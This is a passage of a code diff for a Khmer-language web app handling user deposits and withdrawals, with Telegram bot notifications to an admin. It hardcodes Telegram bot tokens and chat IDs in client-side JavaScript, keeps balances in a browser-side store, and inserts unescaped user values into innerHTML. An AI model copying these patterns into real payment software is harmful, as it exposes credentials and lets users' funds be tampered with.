@@ -116,6 +116,7 @@
         .toast-success { background: linear-gradient(135deg, #10b981, #059669); }
         .toast-error { background: linear-gradient(135deg, #ef4444, #dc2626); }
         .toast-info { background: linear-gradient(135deg, #3b82f6, #2563eb); }
+        .toast-warning { background: linear-gradient(135deg, #f59e0b, #d97706); }
         @keyframes slideUp {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
@@ -525,6 +526,20 @@
                 font-size: 1.8rem;
             }
         }
+        
+        /* Loading spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -648,122 +663,93 @@
         }
 
         // ============================================================
-        //  2.1 TELEGRAM HELPERS - USING XMLHttpRequest (MORE RELIABLE)
+        //  2.1 TELEGRAM HELPERS - USING FETCH API
         // ============================================================
         const DEPOSIT_BOT_TOKEN = '8364652665:AAESgPsrL-Q2D3ZYtLTN6IzdkQ1pLYnc5vw';
         const DEPOSIT_CHAT_ID = '-5410896989';
         const WITHDRAW_BOT_TOKEN = '8790558091:AAGwRivgCppOxQNgMdngSdC1u8U6mz6pwwc';
         const WITHDRAW_CHAT_ID = '-5338881653';
 
-        // Send text message to Telegram using XMLHttpRequest
-        function sendToTelegram(botToken, chatId, message) {
-            return new Promise((resolve) => {
-                try {
-                    console.log('📤 Sending to Telegram via XHR: chat=' + chatId);
-                    const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', url, true);
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-                    xhr.timeout = 30000;
-                    xhr.onload = function() {
-                        if (xhr.status === 200) {
-                            try {
-                                const response = JSON.parse(xhr.responseText);
-                                if (response.ok) {
-                                    console.log('✅ Telegram sent successfully');
-                                    resolve(true);
-                                } else {
-                                    console.error('❌ Telegram error:', response.description);
-                                    resolve(false);
-                                }
-                            } catch (e) {
-                                console.error('❌ Parse error:', e);
-                                resolve(false);
-                            }
-                        } else {
-                            console.error('❌ HTTP error:', xhr.status, xhr.responseText);
-                            resolve(false);
-                        }
-                    };
-                    xhr.onerror = function() {
-                        console.error('❌ XHR error');
-                        resolve(false);
-                    };
-                    xhr.ontimeout = function() {
-                        console.error('❌ XHR timeout');
-                        resolve(false);
-                    };
-                    xhr.send(JSON.stringify({
+        // Send text message to Telegram using Fetch API
+        async function sendToTelegram(botToken, chatId, message) {
+            try {
+                console.log('📤 Sending to Telegram: chat=' + chatId);
+                
+                const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
                         chat_id: chatId,
                         text: message,
                         parse_mode: 'HTML'
-                    }));
-                } catch (err) {
-                    console.error('❌ Telegram send error:', err);
-                    resolve(false);
+                    })
+                });
+
+                if (!response.ok) {
+                    console.error('❌ HTTP error:', response.status);
+                    return false;
                 }
-            });
+
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('✅ Telegram sent successfully');
+                    return true;
+                } else {
+                    console.error('❌ Telegram error:', data.description);
+                    return false;
+                }
+            } catch (err) {
+                console.error('❌ Telegram send error:', err);
+                return false;
+            }
         }
 
-        // Send photo to Telegram using XMLHttpRequest
-        function sendPhotoToTelegram(botToken, chatId, photoBase64, caption) {
-            return new Promise((resolve) => {
-                try {
-                    console.log('📤 Sending photo to Telegram via XHR: chat=' + chatId);
-                    
-                    // Convert base64 to blob
-                    const byteString = atob(photoBase64.split(',')[1]);
-                    const mimeString = photoBase64.split(',')[0].split(':')[1].split(';')[0];
-                    const ab = new ArrayBuffer(byteString.length);
-                    const ia = new Uint8Array(ab);
-                    for (let i = 0; i < byteString.length; i++) {
-                        ia[i] = byteString.charCodeAt(i);
-                    }
-                    const blob = new Blob([ab], { type: mimeString });
-                    
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'screenshot.jpg');
-                    formData.append('caption', caption);
-                    formData.append('parse_mode', 'HTML');
-
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendPhoto', true);
-                    xhr.timeout = 60000;
-                    xhr.onload = function() {
-                        if (xhr.status === 200) {
-                            try {
-                                const response = JSON.parse(xhr.responseText);
-                                if (response.ok) {
-                                    console.log('✅ Photo sent successfully');
-                                    resolve(true);
-                                } else {
-                                    console.error('❌ Photo error:', response.description);
-                                    resolve(false);
-                                }
-                            } catch (e) {
-                                console.error('❌ Parse error:', e);
-                                resolve(false);
-                            }
-                        } else {
-                            console.error('❌ HTTP error:', xhr.status);
-                            resolve(false);
-                        }
-                    };
-                    xhr.onerror = function() {
-                        console.error('❌ XHR error');
-                        resolve(false);
-                    };
-                    xhr.ontimeout = function() {
-                        console.error('❌ XHR timeout');
-                        resolve(false);
-                    };
-                    xhr.send(formData);
-                } catch (err) {
-                    console.error('❌ Photo send error:', err);
-                    resolve(false);
+        // Send photo to Telegram using Fetch API
+        async function sendPhotoToTelegram(botToken, chatId, photoBase64, caption) {
+            try {
+                console.log('📤 Sending photo to Telegram: chat=' + chatId);
+                
+                // Convert base64 to blob
+                const byteString = atob(photoBase64.split(',')[1]);
+                const mimeString = photoBase64.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
                 }
-            });
+                const blob = new Blob([ab], { type: mimeString });
+                
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'screenshot.jpg');
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+
+                const response = await fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    console.error('❌ HTTP error:', response.status);
+                    return false;
+                }
+
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('✅ Photo sent successfully');
+                    return true;
+                } else {
+                    console.error('❌ Photo error:', data.description);
+                    return false;
+                }
+            } catch (err) {
+                console.error('❌ Photo send error:', err);
+                return false;
+            }
         }
 
         // ============================================================
@@ -834,12 +820,12 @@
                 if (result) {
                     showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
                 } else {
-                    showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'error');
+                    showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'warning');
                 }
                 return result;
             } catch (err) {
                 console.error('Deposit Telegram error:', err);
-                showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'error');
+                showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'warning');
                 return false;
             }
         }
@@ -886,12 +872,12 @@
                 if (result) {
                     showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
                 } else {
-                    showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'error');
+                    showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'warning');
                 }
                 return result;
             } catch (err) {
                 console.error('Withdraw Telegram error:', err);
-                showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'error');
+                showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'warning');
                 return false;
             }
         }
@@ -980,7 +966,7 @@
         }
 
         // ============================================================
-        //  6. TRANSACTIONS - FIXED: Admin balance calculation
+        //  6. TRANSACTIONS
         // ============================================================
         function addTransaction(phone, type, amount, note, account) {
             note = note || '';
@@ -1012,7 +998,6 @@
                 DB.setUsers(users);
             }
             
-            // ====== UPDATE ADMIN BALANCE ======
             if (admin) {
                 if (type === 'deposit') {
                     admin.balance += amount;
@@ -1157,7 +1142,7 @@
         }
 
         // ============================================================
-        //  11. PAGE: DEPOSIT (User) - FIXED: Admin balance update
+        //  11. PAGE: DEPOSIT (User)
         // ============================================================
         function renderDeposit(container, user) {
             if (!user) { renderPage('login'); return; }
@@ -1170,7 +1155,7 @@
                         var myDeposits = DB.getDeposits().filter(function(d) { return d.phone === user.phone; }).slice(-5).reverse();
                         if (myDeposits.length === 0) return '<p class="text-sm text-gray-500 mt-2">មិនទាន់មានការបញ្ចូលប្រាក់ទេ</p>';
                         return myDeposits.map(function(d) {
-                            return '\n                            <div class="flex justify-between items-center border-b border-green-200 py-2 text-sm">\n                                <span>' + d.amount.toLocaleString() + ' ៛ ' + (d.account ? '| គណនី: ' + d.account : '') + '</span>\n                                ' + (d.screenshot ? '<img src="' + d.screenshot + '" class="screenshot-thumb" onclick="showImageViewer(\'' + d.screenshot + '\')" title="ចុចដើម្បីមើលរូបភាព" />' : '') + '\n                                <span class="text-xs ' + (d.status === 'pending' ? 'text-yellow-600' : 'text-green-600') + '">' + (d.status === 'pending' ? '⏳ រង់ចាំ' : '✅ បានបញ្ចូល') + '</span>\n                                <span class="text-xs text-gray-400">' + d.date + '</span>\n                            </div>\n                        ';
+                            return '\n                            <div class="flex justify-between items-center border-b border-green-200 py-2 text-sm">\n                                <span>' + d.amount.toLocaleString() + ' ៛ ' + (d.account ? '| គណនី: ' + d.account : '') + '</span>\n                                ' + (d.screenshot ? '<img src="' + d.screenshot + '" class="screenshot-thumb" onclick="showImageViewer(\'' + d.screenshot + '\')" title="ចុចដើម្បីមើលរូបភាព" />' : '') + '\n                                <span class="text-xs ' + (d.status === 'pending' ? 'text-yellow-600' : (d.status === 'approved' ? 'text-green-600' : 'text-red-600')) + '">' + (d.status === 'pending' ? '⏳ រង់ចាំ' : (d.status === 'approved' ? '✅ បានបញ្ចូល' : '❌ បដិសេធ')) + '</span>\n                                <span class="text-xs text-gray-400">' + d.date + '</span>\n                            </div>\n                        ';
                         }).join('');
                     })() + '\n                </div>\n            </div>\n            ';
 
@@ -1189,7 +1174,7 @@
                 e.preventDefault();
                 var btn = document.getElementById('depositSubmitBtn');
                 btn.disabled = true;
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> កំពុងផ្ញើ...';
+                btn.innerHTML = '<span class="spinner"></span> កំពុងផ្ញើ...';
 
                 var bank = document.getElementById('depBank').value;
                 var sender = document.getElementById('depSender').value.trim();
@@ -1234,6 +1219,7 @@
                 deposits.push(depositData);
                 DB.setDeposits(deposits);
 
+                // Send to Telegram
                 await sendDepositTelegram(depositData, screenshotBase64);
 
                 showToast('✅ សំណើបញ្ចូលប្រាក់ត្រូវបានផ្ញើទៅ Admin ហើយ!', 'success');
@@ -1246,15 +1232,16 @@
         }
 
         // ============================================================
-        //  12. PAGE: WITHDRAW (User) - FIXED: Admin balance update
+        //  12. PAGE: WITHDRAW (User)
         // ============================================================
         function renderWithdraw(container, user) {
             if (!user) { renderPage('login'); return; }
-            container.innerHTML = '\n            <div class="max-w-2xl mx-auto bg-white rounded-2xl shadow p-6">\n                <div class="page-header">\n                    <h2><i class="fas fa-hand-holding-usd text-purple-500 mr-2"></i>ដកប្រាក់</h2>\n                    <button onclick="renderPage(\'dashboard\')" class="back-btn"><i class="fas fa-arrow-left"></i> ត្រឡប់</button>\n                </div>\n                <p class="text-gray-500 text-sm mb-4">សមតុល្យបច្ចុប្បន្ន: <strong>' + formatMoney(user.balance) + '</strong></p>\n\n                <form id="withdrawForm">\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-id-card text-blue-500 mr-2"></i>លេខ ID</label>\n                        <input type="text" id="wdMemberId" value="' + (user.memberId || '') + '" readonly class="w-full px-4 py-3 border border-gray-200 rounded-xl bg-gray-50 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-phone text-blue-500 mr-2"></i>លេខទូរសព្ទ</label>\n                        <input type="text" id="wdPhone" value="' + user.phone + '" readonly class="w-full px-4 py-3 border border-gray-200 rounded-xl bg-gray-50 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-user-circle text-blue-500 mr-2"></i>ឈ្មោះ</label>\n                        <input type="text" id="wdName" value="' + user.name + '" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-university text-blue-500 mr-2"></i>ធនាគារទទួល</label>\n                        <select id="wdBank" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none">\n                            <option value="ABA">ABA Bank</option>\n                            <option value="ACLEDA">ACLEDA</option>\n                            <option value="WING">Wing</option>\n                            <option value="TRUE">True Money</option>\n                        </select>\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-hashtag text-blue-500 mr-2"></i>លេខគណនី</label>\n                        <input type="text" id="wdAccount" placeholder="លេខគណនី" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-dollar-sign text-blue-500 mr-2"></i>ចំនួនដក (៛)</label>\n                        <input type="number" id="wdAmount" placeholder="50000" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-qrcode text-purple-500 mr-2"></i>ប្រអប់បញ្ចូល QR Code ទូទាត់របស់អ្នក</label>\n                        <input type="file" id="wdScreenshot" accept="image/*" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none" onchange="previewWithdrawScreenshot(this)" />\n                        <p class="text-xs text-gray-400 mt-1">សូមភ្ជាប់រូបភាព QR Code សម្រាប់ទទួលប្រាក់របស់អ្នក (ABA, Wing, True Money, ។ល។)</p>\n                        <div id="withdrawScreenshotPreview" class="mt-2"></div>\n                    </div>\n                    <button type="submit" id="withdrawSubmitBtn" class="w-full btn-purple text-white font-semibold py-3 rounded-xl transition">\n                        <i class="fas fa-paper-plane mr-2"></i> ផ្ញើសំណើដកប្រាក់\n                    </button>\n                </form>\n\n                <div class="withdraw-box mt-6 scrollable-box-sm">\n                    <h4 class="font-semibold text-gray-700"><i class="fas fa-clock text-purple-600 mr-2"></i>ប្រវត្តិដកប្រាក់</h4>\n                    ' + (function() {
+            
+            container.innerHTML = '\n            <div class="max-w-2xl mx-auto bg-white rounded-2xl shadow p-6">\n                <div class="page-header">\n                    <h2><i class="fas fa-hand-holding-usd text-purple-500 mr-2"></i>ដកប្រាក់</h2>\n                    <button onclick="renderPage(\'dashboard\')" class="back-btn"><i class="fas fa-arrow-left"></i> ត្រឡប់</button>\n                </div>\n                <div class="bg-purple-50 border border-purple-200 rounded-xl p-4 mb-4">\n                    <p class="text-gray-700">សមតុល្យបច្ចុប្បន្ន: <strong class="text-purple-600 text-lg">' + formatMoney(user.balance) + '</strong></p>\n                    <p class="text-xs text-gray-400 mt-1">ចំនួនអប្បបរមាសម្រាប់ដក: 10,000 ៛</p>\n                </div>\n\n                <form id="withdrawForm">\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-id-card text-blue-500 mr-2"></i>លេខ ID</label>\n                        <input type="text" id="wdMemberId" value="' + (user.memberId || '') + '" readonly class="w-full px-4 py-3 border border-gray-200 rounded-xl bg-gray-50 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-phone text-blue-500 mr-2"></i>លេខទូរសព្ទ</label>\n                        <input type="text" id="wdPhone" value="' + user.phone + '" readonly class="w-full px-4 py-3 border border-gray-200 rounded-xl bg-gray-50 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-user-circle text-blue-500 mr-2"></i>ឈ្មោះ</label>\n                        <input type="text" id="wdName" value="' + user.name + '" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-university text-blue-500 mr-2"></i>ធនាគារទទួល</label>\n                        <select id="wdBank" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none">\n                            <option value="ABA">ABA Bank</option>\n                            <option value="ACLEDA">ACLEDA</option>\n                            <option value="WING">Wing</option>\n                            <option value="TRUE">True Money</option>\n                        </select>\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-hashtag text-blue-500 mr-2"></i>លេខគណនី</label>\n                        <input type="text" id="wdAccount" placeholder="លេខគណនី" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-dollar-sign text-blue-500 mr-2"></i>ចំនួនដក (៛)</label>\n                        <input type="number" id="wdAmount" placeholder="50000" min="10000" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none" />\n                    </div>\n                    <div class="mb-3">\n                        <label class="block text-gray-700 text-sm font-medium mb-2"><i class="fas fa-qrcode text-purple-500 mr-2"></i>ប្រអប់បញ្ចូល QR Code ទូទាត់របស់អ្នក</label>\n                        <input type="file" id="wdScreenshot" accept="image/*" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-400 outline-none" onchange="previewWithdrawScreenshot(this)" />\n                        <p class="text-xs text-gray-400 mt-1">សូមភ្ជាប់រូបភាព QR Code សម្រាប់ទទួលប្រាក់របស់អ្នក (ABA, Wing, True Money, ។ល។)</p>\n                        <div id="withdrawScreenshotPreview" class="mt-2"></div>\n                    </div>\n                    <button type="submit" id="withdrawSubmitBtn" class="w-full btn-purple text-white font-semibold py-3 rounded-xl transition">\n                        <i class="fas fa-paper-plane mr-2"></i> ផ្ញើសំណើដកប្រាក់\n                    </button>\n                </form>\n\n                <div class="withdraw-box mt-6 scrollable-box-sm">\n                    <h4 class="font-semibold text-gray-700"><i class="fas fa-clock text-purple-600 mr-2"></i>ប្រវត្តិដកប្រាក់</h4>\n                    ' + (function() {
                         var myWd = DB.getWithdraws().filter(function(w) { return w.phone === user.phone; }).slice(-5).reverse();
                         if (myWd.length === 0) return '<p class="text-sm text-gray-500 mt-2">មិនទាន់មានការដកប្រាក់ទេ</p>';
                         return myWd.map(function(w) {
-                            return '\n                            <div class="flex justify-between items-center border-b border-purple-200 py-2 text-sm">\n                                <span>' + w.amount.toLocaleString() + ' ៛</span>\n                                ' + (w.screenshot ? '<img src="' + w.screenshot + '" class="screenshot-thumb" onclick="showImageViewer(\'' + w.screenshot + '\')" title="ចុចដើម្បីមើលរូបភាព" />' : '') + '\n                                <span class="text-xs ' + (w.status === 'pending' ? 'text-yellow-600' : 'text-green-600') + '">' + (w.status === 'pending' ? '⏳ រង់ចាំ' : '✅ បានដក') + '</span>\n                                <span class="text-xs text-gray-400">' + w.date + '</span>\n                            </div>\n                        ';
+                            return '\n                            <div class="flex justify-between items-center border-b border-purple-200 py-2 text-sm">\n                                <span>' + w.amount.toLocaleString() + ' ៛</span>\n                                ' + (w.screenshot ? '<img src="' + w.screenshot + '" class="screenshot-thumb" onclick="showImageViewer(\'' + w.screenshot + '\')" title="ចុចដើម្បីមើលរូបភាព" />' : '') + '\n                                <span class="text-xs ' + (w.status === 'pending' ? 'text-yellow-600' : (w.status === 'approved' ? 'text-green-600' : 'text-red-600')) + '">' + (w.status === 'pending' ? '⏳ រង់ចាំ' : (w.status === 'approved' ? '✅ បានដក' : '❌ បដិសេធ')) + '</span>\n                                <span class="text-xs text-gray-400">' + w.date + '</span>\n                            </div>\n                        ';
                         }).join('');
                     })() + '\n                </div>\n            </div>\n            ';
 
@@ -1273,7 +1260,7 @@
                 e.preventDefault();
                 var btn = document.getElementById('withdrawSubmitBtn');
                 btn.disabled = true;
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> កំពុងផ្ញើ...';
+                btn.innerHTML = '<span class="spinner"></span> កំពុងផ្ញើ...';
 
                 var bank = document.getElementById('wdBank').value;
                 var accName = document.getElementById('wdName').value.trim();
@@ -1287,8 +1274,16 @@
                     btn.innerHTML = '<i class="fas fa-paper-plane mr-2"></i> ផ្ញើសំណើដកប្រាក់';
                     return;
                 }
+                
+                if (amount < 10000) {
+                    showToast('❌ ចំនួនអប្បបរមាសម្រាប់ដកគឺ 10,000 ៛!', 'error');
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fas fa-paper-plane mr-2"></i> ផ្ញើសំណើដកប្រាក់';
+                    return;
+                }
+                
                 if (amount > user.balance) {
-                    showToast('❌ សមតុល្យមិនគ្រប់គ្រាន់!', 'error');
+                    showToast('❌ សមតុល្យមិនគ្រប់គ្រាន់! អ្នកមានតែ ' + formatMoney(user.balance), 'error');
                     btn.disabled = false;
                     btn.innerHTML = '<i class="fas fa-paper-plane mr-2"></i> ផ្ញើសំណើដកប្រាក់';
                     return;
@@ -1322,6 +1317,7 @@
                 withdraws.push(withdrawData);
                 DB.setWithdraws(withdraws);
 
+                // Send to Telegram
                 await sendWithdrawTelegram(withdrawData, screenshotBase64);
 
                 showToast('✅ សំណើដកប្រាក់ត្រូវបានផ្ញើទៅ Admin ហើយ!', 'success');
@@ -1347,7 +1343,7 @@
 
             var adminInfo = DB.get('adminBankInfo', { bank: 'ABA', account: '001 234 567', qrData: '' });
 
-            container.innerHTML = '\n            <div class="balance-box mb-6">\n                <span class="floating-emoji">💵</span>\n                <span class="floating-emoji">💰</span>\n                <span class="floating-emoji">🎉</span>\n                <span class="floating-emoji">💶</span>\n                <span class="floating-emoji">🛍</span>\n                <span class="floating-emoji">💸</span>\n                <span class="floating-emoji">💳</span>\n                <span class="floating-emoji">💷</span>\n                <span class="floating-emoji">🏦</span>\n                <span class="floating-emoji">✨</span>\n                <div class="balance-content">\n                    <div class="flex items-center justify-between flex-wrap gap-3">\n                        <div>\n                            <p class="text-sm text-blue-200"><i class="fas fa-user-shield mr-2"></i>សមតុល្យ Admin</p>\n                            <p class="text-3xl font-bold ' + (adminBalance === 0 ? 'text-yellow-300' : '') + '">' + formatMoney(adminBalance) + '</p>\n                        </div>\n                        <div class="flex gap-2 flex-wrap">\n                            <button onclick="showAdminDepositModal()" class="bg-white/20 hover:bg-white/30 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-plus-circle"></i> បញ្ចូលប្រាក់\n                            </button>\n                            <button onclick="showAdminDeleteBalanceModal()" class="bg-red-500/30 hover:bg-red-500/40 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-minus-circle"></i> លុបទឹកប្រាក់\n                            </button>\n                            <button onclick="renderPage(\'adminReward\')" class="bg-yellow-500/30 hover:bg-yellow-500/40 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-gift"></i> ប្រាក់រង្វាន់\n                            </button>\n                            <button onclick="renderPage(\'adminIncome\')" class="bg-blue-400/30 hover:bg-blue-400/40 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-hand-holding-usd"></i> ប្រាក់ចំណូល\n                            </button>\n                            <button onclick="renderPage(\'adminHistory\')" class="bg-white/20 hover:bg-white/30 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-history"></i> ប្រវត្តិ\n                            </button>\n                        </div>\n                    </div>\n                    <div class="admin-action-buttons mt-3">\n                        <button onclick="confirmReset()" class="reset-btn"><i class="fas fa-undo mr-1"></i> ចាប់ផ្ដើមឡើងវិញ</button>\n                    </div>\n                </div>\n            </div>\n\n            <div class="grid grid-cols-2 md:grid-cols-3 gap-4 mb-6">\n                <div class="bg-white rounded-2xl shadow p-4 card-hover">\n                    <p class="text-gray-400 text-sm">អ្នកប្រើសរុប</p>\n                    <p class="text-2xl font-bold">' + users.length + '</p>\n                </div>\n                <div class="bg-white rounded-2xl shadow p-4 card-hover relative">\n                    <p class="text-gray-400 text-sm">សំណើបញ្ចូល</p>\n                    <p class="text-2xl font-bold text-green-600">' + deposits.length + '</p>\n                    ' + (deposits.length > 0 ? '<span class="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full w-5 h-5 flex items-center justify-center">' + deposits.length + '</span>' : '') + '\n                </div>\n                <div class="bg-white rounded-2xl shadow p-4 card-hover relative">\n                    <p class="text-gray-400 text-sm">សំណើដក</p>\n                    <p class="text-2xl font-bold text-purple-600">' + withdraws.length + '</p>\n                    ' + (withdraws.length > 0 ? '<span class="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full w-5 h-5 flex items-center justify-center">' + withdraws.length + '</span>' : '') + '\n                </div>\n            </div>\n\n            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">\n                <button onclick="renderPage(\'adminDeposit\')" class="btn-success text-white font-semibold py-4 rounded-2xl shadow transition flex items-center justify-center gap-2 relative btn-with-badge">\n                    <i class="fas fa-plus-circle"></i> អនុម័តបញ្ចូល\n                    ' + (deposits.length > 0 ? '<span class="notification-badge">' + deposits.length + '</span>' : '') + '\n                </button>\n                <button onclick="renderPage(\'adminWithdraw\')" class="btn-purple text-white font-semibold py-4 rounded-2xl shadow transition flex items-center justify-center gap-2 relative btn-with-badge">\n                    <i class="fas fa-arrow-right"></i> អនុម័តដក\n                    ' + (withdraws.length > 0 ? '<span class="notification-badge">' + withdraws.length + '</span>' : '') + '\n                </button>\n            </div>\n\n            <div class="reward-box scrollable-box mb-4">\n                <h4 class="font-semibold text-gray-700"><i class="fas fa-clock text-yellow-600 mr-2"></i>ប្រវត្តិផ្ដល់ប្រាក់រង្វាន់ថ្មីៗ</h4>\n                ' + (rewardsHistory.length === 0 ? '<p class="text-sm text-gray-500 mt-2">មិនទាន់មានការផ្ដល់ប្រាក់រង្វាន់ទេ</p>' :
+            container.innerHTML = '\n            <div class="balance-box mb-6">\n                <span class="floating-emoji">💵</span>\n                <span class="floating-emoji">💰</span>\n                <span class="floating-emoji">🎉</span>\n                <span class="floating-emoji">💶</span>\n                <span class="floating-emoji">🛍</span>\n                <span class="floating-emoji">💸</span>\n                <span class="floating-emoji">💳</span>\n                <span class="floating-emoji">💷</span>\n                <span class="floating-emoji">🏦</span>\n                <span class="floating-emoji">✨</span>\n                <div class="balance-content">\n                    <div class="flex items-center justify-between flex-wrap gap-3">\n                        <div>\n                            <p class="text-sm text-blue-200"><i class="fas fa-user-shield mr-2"></i>សមតុល្យ Admin</p>\n                            <p class="text-3xl font-bold ' + (adminBalance === 0 ? 'text-yellow-300' : '') + '">' + formatMoney(adminBalance) + '</p>\n                        </div>\n                        <div class="flex gap-2 flex-wrap">\n                            <button onclick="showAdminDepositModal()" class="bg-white/20 hover:bg-white/30 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-plus-circle"></i> បញ្ចូលប្រាក់\n                            </button>\n                            <button onclick="showAdminDeleteBalanceModal()" class="bg-red-500/30 hover:bg-red-500/40 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-minus-circle"></i> លុបទឹកប្រាក់\n                            </button>\n                            <button onclick="renderPage(\'adminReward\')" class="bg-yellow-500/30 hover:bg-yellow-500/40 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-gift"></i> ប្រាក់រង្វាន់\n                            </button>\n                            <button onclick="renderPage(\'adminIncome\')" class="bg-blue-400/30 hover:bg-blue-400/40 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-hand-holding-usd"></i> ប្រាក់ចំណូល\n                            </button>\n                            <button onclick="renderPage(\'adminHistory\')" class="bg-white/20 hover:bg-white/30 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">\n                                <i class="fas fa-history"></i> ប្រវត្តិ\n                            </button>\n                        </div>\n                    </div>\n                    <div class="admin-action-buttons mt-3">\n                        <button onclick="confirmReset()" class="reset-btn"><i class="fas fa-undo mr-1"></i> ចាប់ផ្ដើមឡើងវិញ</button>\n                    </div>\n                </div>\n            </div>\n\n            <div class="grid grid-cols-2 md:grid-cols-3 gap-4 mb-6">\n                <div class="bg-white rounded-2xl shadow p-4 card-hover">\n                    <p class="text-gray-400 text-sm">អ្នកប្រើសរុប</p>\n                    <p class="text-2xl font-bold">' + users.filter(u => u.role !== 'admin').length + '</p>\n                </div>\n                <div class="bg-white rounded-2xl shadow p-4 card-hover relative">\n                    <p class="text-gray-400 text-sm">សំណើបញ្ចូល</p>\n                    <p class="text-2xl font-bold text-green-600">' + deposits.length + '</p>\n                    ' + (deposits.length > 0 ? 